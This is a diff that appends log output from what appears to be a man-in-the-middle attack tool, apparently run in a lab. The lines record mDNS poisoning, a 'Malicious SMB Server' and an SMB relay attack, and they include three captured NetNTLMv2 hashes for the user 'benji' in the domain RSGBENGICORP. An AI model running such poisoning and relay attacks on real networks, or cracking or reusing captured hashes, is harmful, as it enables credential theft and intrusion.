@@ -1228,3 +1228,47 @@
 2021-11-17 18:19:37.534 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:330 - Exiting smb relay attack ...
 2021-11-17 18:19:42.974 | WARNING  | project.ManInTheMiddle.maninthemiddle:__file_exits:371 - The file will be overwrite, do you want to continue ?(y)
 2021-11-17 18:19:45.768 | INFO     | project.ManInTheMiddle.maninthemiddle:__checking_conditions_for_attack:414 - Exiting ...
+2021-11-20 15:33:02.145 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:124 - Running mss the results will be saved in : /home/rsgbengi/Igris
+2021-11-20 15:33:02.155 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-20 15:33:02.155 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
+2021-11-20 15:33:02.166 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-11-20 15:33:02.178 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-11-20 15:33:02.179 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-11-20 15:33:33.295 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-20 15:33:33.337 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-20 15:33:34.265 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.130,49806)
+2021-11-20 15:33:34.302 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-11-20 15:33:34.303 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BENJI\benji authenticated successfully
+2021-11-20 15:33:34.305 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:39e09d0fa68130f267a447f62d95e0c4:010100000000000000db94fa23ded7017682f4793bb59190000000000100100057004b004c00480045006900500049000300100057004b004c00480045006900500049000200100062004a004b0056007500660071006f000400100062004a004b0056007500660071006f000700080000db94fa23ded70106000400020000000800300030000000000000000000000000200000c599c7d6e2c9084e7caf6be8502c82a1b7a36c7fbd631aea1b7943210ac9e4930a0010000000000000000000000000000000000009002a0063006900660073002f00640061006c0065006500650065006500650065002e006c006f00630061006c000000000000000000
+2021-11-20 15:33:34.322 | INFO     | impacket.smbserver:NetrWkstaGetInfo:4534 - NetrWkstaGetInfo Level: 100
+2021-11-20 15:33:34.340 | INFO     | impacket.smbserver:NetrServerGetInfo:4624 - NetrServerGetInfo Level: 101
+2021-11-20 15:33:34.908 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2021-11-20 15:33:38.410 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:115 - Exiting smb relay attack ...
+2021-11-20 15:33:45.421 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:124 - Running mss the results will be saved in : /home/rsgbengi/Igris
+2021-11-20 15:33:45.432 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
+2021-11-20 15:33:45.439 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-11-20 15:33:45.440 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-11-20 15:33:45.441 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-11-20 15:34:00.001 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.130,49827)
+2021-11-20 15:34:00.024 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-11-20 15:34:00.024 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BENJI\benji authenticated successfully
+2021-11-20 15:34:00.025 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:5d715f865fc2c555426c529f6287ff19:01010000000000000024140a24ded701631681a27e98e99300000000010010006100420062006600470058007a004200030010006100420062006600470058007a0042000200100065006f007300560069006700470066000400100065006f00730056006900670047006600070008000024140a24ded70106000400020000000800300030000000000000000000000000200000c599c7d6e2c9084e7caf6be8502c82a1b7a36c7fbd631aea1b7943210ac9e4930a001000000000000000000000000000000000000900280063006900660073002f006c0061005f0068006f0073007400690061002e006c006f00630061006c000000000000000000
+2021-11-20 15:34:00.043 | INFO     | impacket.smbserver:NetrWkstaGetInfo:4534 - NetrWkstaGetInfo Level: 100
+2021-11-20 15:34:00.059 | INFO     | impacket.smbserver:NetrServerGetInfo:4624 - NetrServerGetInfo Level: 101
+2021-11-20 15:34:00.098 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2021-11-20 15:34:02.820 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:64 - Finishing mss attack in the background ...
+2021-11-20 15:34:10.460 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:124 - Running mss the results will be saved in : /home/rsgbengi/Igris
+2021-11-20 15:34:10.474 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
+2021-11-20 15:34:10.488 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-11-20 15:34:10.489 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-11-20 15:34:10.489 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-11-20 15:34:15.346 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.130,49839)
+2021-11-20 15:34:15.371 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-11-20 15:34:15.373 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BENJI\benji authenticated successfully
+2021-11-20 15:34:15.379 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:a86e35e50701bf31c9e14cf144aad3b2:010100000000000080f5041324ded701caa9de5d85252a280000000001001000680045006900660076004900710071000300100068004500690066007600490071007100020010006a006100530049006c004a0065006800040010006a006100530049006c004a00650068000700080080f5041324ded70106000400020000000800300030000000000000000000000000200000c599c7d6e2c9084e7caf6be8502c82a1b7a36c7fbd631aea1b7943210ac9e4930a001000000000000000000000000000000000000900280063006900660073002f006c0061005f0068006f0073007400690061002e006c006f00630061006c000000000000000000
+2021-11-20 15:34:15.407 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2021-11-20 15:34:15.451 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2021-11-20 15:34:15.728 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2021-11-20 15:34:26.105 | INFO     | impacket.smbserver:smbComTreeDisconnect:1921 - Disconnecting Share(1:IPC$)
+2021-11-20 15:34:26.107 | INFO     | impacket.smbserver:finish:3798 - Closing down connection (192.168.253.130,49839)
+2021-11-20 15:34:26.107 | INFO     | impacket.smbserver:removeConnection:3946 - Remaining connections []
